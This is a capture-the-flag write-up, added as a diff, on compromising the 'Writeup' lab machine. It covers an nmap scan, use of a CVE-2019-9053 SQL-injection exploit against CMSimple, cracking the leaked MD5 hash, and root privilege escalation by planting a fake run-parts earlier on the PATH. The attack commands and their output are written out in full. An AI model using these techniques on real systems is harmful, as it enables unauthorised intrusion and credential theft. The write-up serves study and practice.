@@ -1,0 +1,84 @@
+Writeup - 10.10.10.138
+
+
+First things first fire up nmap see what is going on....
+
+
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
+|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
+|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/writeup/
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Nothing here yet.
+
+Instantly see activity on port 80 so lets head over and see what
+kind of webapp is running in the writeup directory. 
+
+http://10.10.10.138/writeup/ - dir to start
+
+After scanning we see writeup and using wappalyzer a builtin tool in our firefox. Just
+search for the plugin for you version of firefox. Other ways to identify but found its 
+running CMSimple. We then search for any exploits and find a CVE-2019-9053 vulnerability
+so we try our exploit -
+
+python another1.py -u http://10.10.10.138/writeup/
+
+Salt for password found: 5a599ef579066807n[+] Username found: jkrn[+] Email found: jkr@writeup.htbn[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+
+I seen other ways but anyone who looks for the path for the least resistance for
+bloods was able to crack it in 5 seconds on MD5crackstation.
+
+Creds so far 
+
+62def4866937f08cc13bab43bb14e6f7 : 5a599ef579066807 - raykayjay9
+
+username - jkr
+password - raykayjay9
+
+We now login and find ourselves our first flag and begin to right
+away dig around to privlage escalate. 
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jul  5 16:23:24 2019 from 10.10.14.63
+jkr@writeup:~$ ls
+user.txt
+jkr@writeup:~$ cat user.txt
+d4e493fd4068af***************
+jkr@writeup:~$
+
+
+Now after digging around I found this running as users login to the
+box if you notice it is running a script as root to update the message
+of the day. 
+
+2019/07/05 20:34:34 CMD: UID=0    PID=8421   | run-parts --lsbsysinit /etc/update-motd.d 
+2019/07/05 20:34:34 CMD: UID=0    PID=8422   | /bin/sh /etc/update-motd.d/10-uname
+
+So we look around and see that run-parts script is coming from the /bin
+directory so if we can write for example further up the line we can inject
+our own run-parts and exploit the root flag that way. 
+
+So that is exactly what we do and you can get yourself a shell or just copy the password either
+way it will lead to privlage escalation. 
+
+jkr@writeup:/usr/sbin$ echo "cat /root/root.txt" > /usr/local/sbin/run-parts
+jkr@writeup:/usr/sbin$ chmod +x /usr/local/sbin/run-parts
+
+So as we can see I jumped up the line and was able to write in the /usr/local/sbin/ directory allowing
+us to place our script ahead of the path PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin as you can see /bin is at the end of the line in the env variable. 
+
+After loggin back in to test our exploit we got the root flag printed right
+on the login motd so now we have root!
+
+root:/:# ssh jkr@10.10.10.138
+jkr@10.10.10.138's password: 
+eeba47f60b48ef92b7************** (Root Flag!!)
+
+So now we have pwned both flags and rooted writeup.
+
+#Hacktheplanet
